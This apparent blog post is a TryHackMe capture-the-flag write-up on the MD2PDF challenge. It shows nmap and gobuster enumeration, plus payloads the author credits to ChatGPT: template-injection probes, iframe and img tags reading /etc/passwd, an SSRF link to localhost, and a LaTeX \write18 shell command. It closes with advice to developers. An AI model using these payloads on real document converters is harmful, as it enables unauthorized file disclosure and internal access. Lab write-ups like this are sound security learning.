---
title: "Challenges: MD2PDF (TryHackMe)"
datePublished: Fri Jul 25 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmdn5izps001002lk812cg2nw
slug: challenges-md2pdf-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1753709646111/7c346a8f-d970-406b-aa63-49115ff05909.png
tags: tryhackme, websecurity, ssrf, input-validation, gobuster, ctf-writeup, md2pdf

---

TopTierConversions LTD released MD2PDF, a tool designed to convert Markdown documents into PDF quickly and securely—or so they claimed. As part of this challenge, we were tasked with testing the service for weaknesses. At first glance, it seemed simple: upload Markdown, get a PDF. But upon further exploration and research, it became clear that such services often hide interesting vulnerabilities, including template injection, HTML injection, and SSRF.

Hello Hacker!

TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF.

This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?

*Note: Please allow 3-5 minutes for the VM to boot up fully before attempting the challenge.*

### Answer the questions below

What is the flag?

`nmap -sV IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753708075027/87e2c016-50d5-4060-ac18-4ada977515e7.png align="center")

I visited the site and saw the MD2PDF and convert to PDF. I tried to type some text and it work be converted into pdf but didn’t find the flag yet. I went to research on ChatGPT since this is my first challenge of this nature and these are some payload tests like {{7\*}} that it suggested and i would like to add it to the writeup.

### **When You See an MD2PDF Service (CTF Context)**

1. **Understand the Attack Surface**
    
    * These services typically take Markdown and convert it to PDF using a backend library like Pandoc, wkhtmltopdf, or similar.
        
    * Potential issues: **HTML Injection, Template Injection (SSTI), File Reads, SSRF, or Command Injection**.
        
2. **Quick Payload Tests**
    
    * **SSTI Check**: `{{7*7}}` → If output is `49`, template injection is possible (often Jinja2).
        
    * **HTML Injection**: Test raw HTML inside Markdown:
        
        ```makefile
        <iframe src="file:///etc/passwd"></iframe>
        ```
        
        or
        
        ```makefile
        <img src="file:///etc/passwd">  
        ```
        
    * **SSRF**: External or internal service discovery:
        
        ```makefile
        ![](http://127.0.0.1:5000/flag)  
        ```
        
3. **Backend-Specific Exploits**
    
    * **Pandoc (LaTeX)**: Sometimes supports shell execution (`--shell-escape`).
        
        ```makefile
        ---
        header-includes:
          - \write18{cat /etc/passwd}
        ---
        ```
        
4. **Directory/Path Enumeration**
    
    * Use `gobuster`, `ffuf`, or similar tools to find hidden paths like `/admin` or `/flag`.
        
    * If found, embed it in Markdown:
        
        ```makefile
        <iframe src="http://localhost:port/path"></iframe>
        ```
        
    * Convert and check the generated PDF for leaked content.  
        

It wasn’t helpful at first so I went back and used gobuster to check the hidden paths and found one

`gobuster dir -u IP_Address -w /usr/share/wordlists/dirb/common.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753708103298/64ef080b-ffbe-4346-b8f4-6ef14e1486eb.png align="center")

  

I tried checking the site: `http://IP_Address:5000/admin` on this path but it would still open the MD2PDF then went back to the suggestions and ended up using `iframe` together with the hidden `path` and the open `port` 5000. The click of Convert to PDF and you’ll find the flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753708279968/392dd42b-097a-4755-b160-6f8de819ac5d.png align="center")

  
  
  

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753709461158/4fbd4b40-7b36-4e1e-84aa-cd80b507d2ef.png align="center")

  

### **Lesson for Developers**

Developers should be cautious when integrating third-party libraries or features like Markdown-to-PDF conversion:

* **Validate and sanitize all user input** before processing.
    
* **Disable potentially dangerous features** in conversion libraries (e.g., raw HTML or shell execution).
    
* **Restrict internal access** so that SSRF or file inclusion isn’t possible through generated documents.
    
* **Conduct security testing** as part of your CI/CD process to catch such issues early.
    

This challenge demonstrated how a seemingly harmless Markdown-to-PDF conversion service can be exploited when input handling and sanitization are overlooked. By combining enumeration (to discover hidden paths) and creative Markdown payloads, we were able to access internal resources and retrieve the flag.